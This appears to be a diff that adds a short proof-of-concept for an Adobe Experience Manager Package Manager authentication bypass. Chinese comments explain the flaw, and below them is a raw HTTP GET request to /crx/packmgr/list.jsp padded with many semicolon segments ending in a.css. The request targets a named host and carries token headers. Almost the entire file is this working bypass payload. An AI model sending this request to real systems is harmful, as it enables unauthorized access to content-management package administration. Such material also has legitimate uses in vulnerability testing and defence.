@@ -1,0 +1,25 @@
+# AEM Package Manager 认证绕过漏洞
+# adobeexperience Manager包管理器容易出现难以利用的身份验证绕过问题。如果删除了默认的安全配置，此问题只会潜在地影响内部AEM或作为托管服务的AEM。
+GET /crx/packmgr/list.jsp;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+a.css?_dc=1615863080856&_charset_=utf-8&includeVersions=true&acid=80001476&bid=hd_tag_m8mv2602 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv2602
+RM-PRO-Token: d5a4d9acd6fd34a95770637bdf134bfb
+RM-PRO-Time: 1742808518480
+User-Agent: curl/7.83.1
+
